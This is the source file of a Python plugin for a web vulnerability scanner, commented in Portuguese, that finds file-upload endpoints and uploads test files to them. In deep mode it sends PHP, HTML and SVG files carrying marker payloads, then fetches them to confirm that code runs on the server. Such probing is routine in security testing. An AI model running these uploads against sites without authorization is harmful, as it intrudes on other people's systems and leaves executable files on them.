#!/usr/bin/env python3
"""
Insecure File Upload (V10.2 Precision) — Detecta endpoints de upload e tenta upload real
para verificar execução. Testa .php, .html, .svg com payloads XSS/RCE.
"""
import json
import time
import re
import httpx
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

UPLOAD_PATTERNS = [
    r"/upload", r"/import", r"/attach", r"/file", r"/media/upload",
    r"/api/upload", r"/api/file", r"/documents", r"/assets/upload",
]

DANGEROUS_EXTENSIONS = [".php", ".jsp", ".asp", ".aspx", ".exe", ".sh", ".py", ".pl", ".cgi", ".svg", ".html"]

# V11: Arquivo SEGURO para teste básico (não trigga WAF, não polui dados)
SAFE_UPLOAD_FILE = {
    "filename": "allma_test.txt",
    "content": b"allma_upload_test_v11",
    "mime": "text/plain",
    "marker": "allma_upload_test_v11",
    "risk_if_exec": "INFO",
}

# V11: Payloads AGRESSIVOS — apenas com --deep
DEEP_UPLOAD_FILES = [
    {
        "filename": "allma_test.php",
        "content": b"<?php echo 'allma_rce_test_v11'; ?>",
        "mime": "application/x-php",
        "marker": "allma_rce_test_v11",
        "risk_if_exec": "CRITICAL",
    },
    {
        "filename": "allma_test.html",
        "content": b"<html><body><script>document.write('allma_xss_test_v11')</script></body></html>",
        "mime": "text/html",
        "marker": "allma_xss_test_v11",
        "risk_if_exec": "HIGH",
    },
    {
        "filename": "allma_test.svg",
        "content": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("allma_svg_xss_v11")</script></svg>',
        "mime": "image/svg+xml",
        "marker": "allma_svg_xss_v11",
        "risk_if_exec": "HIGH",
    },
]

# V11: Indicadores de que o body confirma upload real (reduz falsos positivos)
UPLOAD_SUCCESS_INDICATORS = [
    "uploaded", "success", "file_url", "file_path", "filename",
    "url", "location", "stored", "saved", "created",
]
# V11: Indicadores de que a resposta é uma página de login/erro (falso positivo)
FALSE_POSITIVE_INDICATORS = [
    "login", "sign in", "authenticate", "unauthorized", "csrf",
    "403 forbidden", "access denied", "not allowed",
]

def _test_upload_endpoint(url: str) -> dict | None:
    """Testa se um endpoint aceita uploads e quais métodos/tipos."""
    try:
        time.sleep(REQUEST_DELAY)
        with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
            # OPTIONS
            resp_options = client.options(url, headers={"User-Agent": DEFAULT_USER_AGENT})
            allowed = resp_options.headers.get("allow", "").upper()
            accepts_post = "POST" in allowed or "PUT" in allowed

            # Tentar POST com multipart vazio
            resp_post = client.post(url, files={"file": ("test.txt", b"test", "text/plain")},
                                     headers={"User-Agent": DEFAULT_USER_AGENT})

            # V11: Aceitar apenas 200/201/202 (removido 204 — CORS preflight falso positivo)
            if resp_post.status_code in (200, 201, 202):
                body = resp_post.text[:3000].lower()

                # V11: Detectar falsos positivos — páginas de login/erro retornando 200
                if any(fp in body for fp in FALSE_POSITIVE_INDICATORS):
                    return None  # Não é upload real

                # V11: Validar se o body indica upload real, não apenas POST 200 genérico
                has_upload_indicator = any(ind in body for ind in UPLOAD_SUCCESS_INDICATORS)
                has_dangerous_ext = any(ext in body for ext in [".php", ".jsp", ".asp"])

                if has_dangerous_ext:
                    risk = "CRITICAL"
                    details = f"Endpoint aceita POST (status {resp_post.status_code}) — extensões perigosas detectadas no response"
                elif has_upload_indicator:
                    risk = "HIGH"
                    details = f"Endpoint aceita POST (status {resp_post.status_code}) — indicadores de upload confirmados no body"
                else:
                    risk = "MEDIUM"
                    details = f"Endpoint aceita POST (status {resp_post.status_code}) — sem confirmação explícita de upload no body"

                return {
                    "url": url,
                    "status": resp_post.status_code,
                    "methods_allowed": allowed,
                    "risk": risk,
                    "type": "FILE_UPLOAD",
                    "details": details,
                    "upload_confirmed": has_upload_indicator,
                    "request_raw": format_http_request(resp_post.request),
                    "response_raw": format_http_response(resp_post),
                }
    except Exception:
        pass
    return None


def _test_real_upload(url: str, test_files: list) -> list:
    """V11: Tenta upload real e verifica execução. Recebe lista de arquivos para testar."""
    findings = []
    
    for test_file in test_files:
        time.sleep(REQUEST_DELAY)
        try:
            with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False) as client:
                # Upload do arquivo
                resp = client.post(
                    url,
                    files={"file": (test_file["filename"], test_file["content"], test_file["mime"])},
                    headers={"User-Agent": DEFAULT_USER_AGENT}
                )
                
                if resp.status_code not in (200, 201, 202):
                    continue
                
                body = resp.text
                uploaded_url = None
                
                # Tentar extrair URL do arquivo uploadado do response
                import re as _re
                url_matches = _re.findall(r'(?:https?://[^\s"\'<>]+|/[^\s"\'<>]*' + _re.escape(test_file["filename"]) + r')', body)
                if url_matches:
                    uploaded_url = url_matches[0]
                    if not uploaded_url.startswith("http"):
                        parsed = urlparse(url)
                        uploaded_url = f"{parsed.scheme}://{parsed.netloc}{uploaded_url}"
                
                details = f"Upload de '{test_file['filename']}' aceito (status {resp.status_code})"
                risk = "MEDIUM" if test_file["filename"].endswith(".txt") else "HIGH"
                executed = False
                
                # Tentar acessar o arquivo uploadado para verificar execução
                if uploaded_url:
                    time.sleep(REQUEST_DELAY)
                    try:
                        exec_resp = client.get(uploaded_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                        if test_file["marker"] in exec_resp.text:
                            executed = True
                            risk = test_file["risk_if_exec"]
                            details += f" | EXECUÇÃO CONFIRMADA: Marker '{test_file['marker']}' encontrado em {uploaded_url}"
                        elif exec_resp.status_code == 200:
                            details += f" | Arquivo acessível em {uploaded_url} (sem execução de código detectada)"
                    except Exception:
                        pass
                
                findings.append({
                    "url": url,
                    "type": "FILE_UPLOAD",
                    "risk": risk,
                    "filename": test_file["filename"],
                    "mime_type": test_file["mime"],
                    "upload_status": resp.status_code,
                    "executed": executed,
                    "uploaded_url": uploaded_url,
                    "details": details,
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                })
                
                if executed:
                    break  # Se execução confirmada, não precisa testar mais
                    
        except Exception:
            pass
    return findings


def run(context: dict):
    target = context.get("target")
    deep = context.get("deep", False)
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   📤 {C.BOLD}{C.CYAN}INSECURE FILE UPLOAD SCANNER (V10.2 PRECISION){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END} | Deep: {deep}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "file_upload")

    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        warn("⚠️ urls_200.txt não encontrado.")
        (outdir / "file_upload_results.json").write_text(json.dumps([], indent=2))
        (outdir / "scan_summary.json").write_text(json.dumps({"tests_run": 0, "findings": 0, "status": "NO_INPUT"}, indent=2))
        return []

    all_urls = [l.strip() for l in urls_file.read_text(errors="ignore").splitlines() if l.strip()]

    # Filtrar URLs com padrão de upload
    candidates = []
    for url in all_urls:
        path = urlparse(url).path.lower()
        if any(re.search(p, path, re.I) for p in UPLOAD_PATTERNS):
            candidates.append(url)

    candidates = list(set(candidates))[:30]
    info(f"   📋 {len(candidates)} endpoints de upload detectados")

    if not candidates:
        info("   ✅ Nenhum endpoint de upload detectado.")
        (outdir / "file_upload_results.json").write_text(json.dumps([], indent=2))
        (outdir / "scan_summary.json").write_text(json.dumps({"tests_run": 0, "urls_checked": len(all_urls), "findings": 0, "status": "NO_UPLOAD"}, indent=2))
        return []

    results = []

    # Fase 1: Detecção básica (existente)
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(_test_upload_endpoint, url): url for url in candidates}
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    results.append(result)
                    color = C.RED if result["risk"] in ("HIGH", "CRITICAL") else C.YELLOW
                    info(f"   {color}[{result['risk']}]{C.END} {result['url']}")
            except Exception:
                pass

    # V11 Fase 2: Upload real para confirmar se o endpoint aceita arquivos
    upload_accepting = [r["url"] for r in results if r.get("status") in (200, 201, 202)]
    test_urls = upload_accepting if upload_accepting else candidates[:10]
    
    if test_urls:
        if deep:
            # DEEP MODE: Testa com PHP/HTML/SVG (agressivo)
            test_files = DEEP_UPLOAD_FILES
            warn(f"   ⚠️  [DEEP MODE] Testando upload de .php/.html/.svg em {len(test_urls)} endpoints...")
        else:
            # MODO NORMAL: Apenas .txt inofensivo para confirmar upload
            test_files = [SAFE_UPLOAD_FILE]
            info(f"   📄 Testando upload de arquivo .txt seguro em {len(test_urls)} endpoints...")
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(_test_real_upload, url, test_files): url for url in test_urls}
            for future in as_completed(futures):
                try:
                    res = future.result()
                    if res:
                        results.extend(res)
                        for f in res:
                            if f.get("executed"):
                                info(f"   🔴 {C.RED}[{f['risk']}]{C.END} 🚨 EXECUÇÃO CONFIRMADA: {f['filename']} em {f['url']}")
                            else:
                                info(f"   🟡 {C.YELLOW}[{f['risk']}]{C.END} Upload aceito: {f['filename']} em {f['url']}")
                except Exception:
                    pass
        
        # Sugerir --deep se encontrou endpoints que aceitam upload no modo normal
        if not deep and any(r.get("filename", "").endswith(".txt") for r in results):
            info(f"   ℹ️  Use --deep para testar com payloads reais (.php/.html/.svg).")

    output_file = outdir / "file_upload_results.json"
    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    summary = {"tests_run": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if results:
        success(f"\n   📤 {len(results)} upload endpoint(s) com risco!")
    else:
        info(f"   ✅ 0 uploads vulneráveis. Testados {len(candidates)} endpoints.")

    success(f"   📂 Salvos em {output_file}")
    return results
